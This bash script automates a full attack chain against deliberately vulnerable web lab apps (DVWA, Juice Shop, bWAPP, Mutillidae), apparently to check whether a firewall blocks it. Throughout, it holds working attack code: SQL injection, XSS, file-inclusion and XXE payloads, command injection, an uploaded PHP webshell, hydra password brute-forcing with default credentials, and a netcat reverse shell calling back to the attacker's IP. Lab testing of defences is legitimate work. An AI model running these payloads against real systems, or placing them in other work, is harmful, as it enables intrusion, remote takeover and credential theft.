#!/bin/bash
set -u

TARGET="${1:?Usage: $0 <target-public-ip>}"
BASE="http://${TARGET}"
ATTACKER_IP="$(hostname -I | awk '{print $1}')"
LSHELL_PORT="${LSHELL_PORT:-4444}"
RUN_DIR="/root/lab/evidence/$(date +%Y%m%d-%H%M%S)"
COOKIE_JAR="${RUN_DIR}/cookies.txt"
SUMMARY="${RUN_DIR}/summary.txt"

mkdir -p "${RUN_DIR}"
echo "Target: ${TARGET} (attacker: ${ATTACKER_IP})" | tee "${SUMMARY}"
echo "Evidence dir: ${RUN_DIR}"

phase() {
  echo "" | tee -a "${SUMMARY}"
  echo "==== $1 ====" | tee -a "${SUMMARY}"
}

run_cmd() {
  local name="$1"
  shift
  echo ">> $name: $*" | tee -a "${SUMMARY}"
  timeout "${TIMEOUT_SECONDS:-120}" "$@" 2>&1 | tee "${RUN_DIR}/${name}.log"
  echo ">> $name exit=$? — log: ${RUN_DIR}/${name}.log" | tee -a "${SUMMARY}"
}

phase "Step 0 — DVWA login"
curl -s -c "${COOKIE_JAR}" "${BASE}/login.php" > /dev/null
curl -s -b "${COOKIE_JAR}" -c "${COOKIE_JAR}" \
  -d "username=admin&password=password&Login=Login" "${BASE}/login.php" > /dev/null
if curl -s -b "${COOKIE_JAR}" "${BASE}/index.php" | grep -q "Welcome to Damn Vulnerable Web Application"; then
  echo "LOGIN OK" | tee -a "${SUMMARY}"
else
  echo "LOGIN FAILED — check NGFW WAF is not blocking legit login" | tee -a "${SUMMARY}"
fi
PHPSESSID="$(grep -oP 'PHPSESSID\s+\K.*' "${COOKIE_JAR}")"

phase "Phase 1 — Reconnaissance (nmap)"
run_cmd "nmap" nmap -sS -sV -p- "${TARGET}"

phase "Phase 2.1 — SQL Injection (sqlmap)"
run_cmd "sqlmap" sqlmap -u "${BASE}/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=${PHPSESSID}" --batch

phase "Phase 2.2 — Reflected XSS"
run_cmd "xss" curl -s -b "${COOKIE_JAR}" \
  "${BASE}/vulnerabilities/xss_r/?name=<script>alert(1)</script>"

phase "Phase 2.3 — Local File Inclusion"
run_cmd "lfi" curl -s -b "${COOKIE_JAR}" \
  "${BASE}/vulnerabilities/fi/?page=../../../../etc/passwd"

phase "Phase 2.4 — Command Injection"
run_cmd "cmdi" curl -s -b "${COOKIE_JAR}" \
  -d "ip=127.0.0.1%3B+whoami&Submit=Submit" "${BASE}/vulnerabilities/exec/"

phase "Phase 2.5 — Webshell Upload"
echo '<?php system($_GET["cmd"]); ?>' > "${RUN_DIR}/shell.php"
run_cmd "upload" curl -s -b "${COOKIE_JAR}" \
  -F "uploaded=@${RUN_DIR}/shell.php;type=image/png" -F "Upload=Upload" \
  "${BASE}/vulnerabilities/upload/"

phase "Phase 3 — Brute Force (hydra, top 200 passwords)"
if [ -f /usr/share/wordlists/rockyou.txt ]; then
  head -n 200 /usr/share/wordlists/rockyou.txt > "${RUN_DIR}/top200.txt"
  run_cmd "hydra" hydra -l admin -P "${RUN_DIR}/top200.txt" http-get-form \
    "${BASE}/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"
else
  echo "SKIP: rockyou.txt not found (install wordlists or supply -P yourself)" | tee -a "${SUMMARY}"
fi

phase "Phase 4 — Reverse Shell"
bash /root/lab/reverse-shell-listener.sh "${LSHELL_PORT}" > "${RUN_DIR}/listener.log" 2>&1 &
LISTENER_PID=$!
sleep 1
curl -s -b "${COOKIE_JAR}" --max-time 10 \
  "${BASE}/hackable/uploads/shell.php?cmd=nc+-e+/bin/sh+${ATTACKER_IP}+${LSHELL_PORT}" \
  | tee "${RUN_DIR}/shell-trigger.log"
sleep 3
if grep -qi "connect to" "${RUN_DIR}/listener.log"; then
  echo "REVERSE SHELL CONNECTED (check listener.log)" | tee -a "${SUMMARY}"
else
  echo "REVERSE SHELL NO CONNECTION (expected if NGFW blocked egress)" | tee -a "${SUMMARY}"
fi
kill "${LISTENER_PID}" 2>/dev/null

phase "Phase 5 — OWASP Juice Shop (port 3000)"
run_cmd "juice-sqli" curl -s \
  "${BASE}:3000/rest/products/search?q='))%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54--"
run_cmd "juice-xss" curl -s \
  "${BASE}:3000/rest/products/search?q=<script>alert(1)</script>"
run_cmd "juice-default-creds" curl -s -X POST "${BASE}:3000/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op","password":"admin123"}'

phase "Phase 6 — bWAPP (port 8080)"
BWAPP_JAR="${RUN_DIR}/bwapp_cookies.txt"
curl -s -c "${BWAPP_JAR}" -b "${BWAPP_JAR}" "${BASE}:8080/login.php" > /dev/null
curl -s -c "${BWAPP_JAR}" -b "${BWAPP_JAR}" \
  -d "login=login&form=login&username=bee&password=bug" "${BASE}:8080/login.php" > /dev/null
run_cmd "bwapp-cmdi" curl -s -b "${BWAPP_JAR}" \
  "${BASE}:8080/commandi.php?ip=127.0.0.1%3B+whoami&form=submit"
run_cmd "bwapp-xxe" curl -s -b "${BWAPP_JAR}" -X POST \
  -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><name>&xxe;</name></root>' \
  "${BASE}:8080/xxe-1.php"
run_cmd "bwapp-sqli" curl -s -b "${BWAPP_JAR}" \
  "${BASE}:8080/sqli-1.php?title=1%27+OR+1%3D1--&action=search"
run_cmd "bwapp-xss" curl -s -b "${BWAPP_JAR}" \
  "${BASE}:8080/xss-get-1.php?firstname=<script>alert(1)</script>&lastname=x&form=submit"

phase "Phase 7 — Mutillidae (port 8081)"
MUT_JAR="${RUN_DIR}/mutillidae_cookies.txt"
curl -s -c "${MUT_JAR}" -b "${MUT_JAR}" "${BASE}:8081/login.php" > /dev/null
curl -s -c "${MUT_JAR}" -b "${MUT_JAR}" \
  -d "username=admin%40example.com&password=admin&login-php-submit-button=Login" \
  "${BASE}:8081/login.php" > /dev/null
run_cmd "mut-sqli" curl -s -b "${MUT_JAR}" \
  "${BASE}:8081/index.php?page=user-info.php&username=1%27+OR+1%3D1--&password=x&user-info-php-submit-button=View+Account+Details"
run_cmd "mut-cmdi" curl -s -b "${MUT_JAR}" \
  "${BASE}:8081/index.php?page=dns-lookup.php&target_host=127.0.0.1%3B+whoami&dns-lookup-php-submit-button=Lookup+DNS"
run_cmd "mut-xss" curl -s -b "${MUT_JAR}" \
  "${BASE}:8081/index.php?page=dns-lookup.php&target_host=<script>alert(1)</script>&dns-lookup-php-submit-button=Lookup+DNS"

phase "Phase 8 — Sanity reminder"
echo "Legit browsing check is done manually from the LAN client VM (design doc Phase 8)" | tee -a "${SUMMARY}"

phase "DONE — evidence in ${RUN_DIR}"
echo "Review: cat ${SUMMARY}" | tee -a "${SUMMARY}"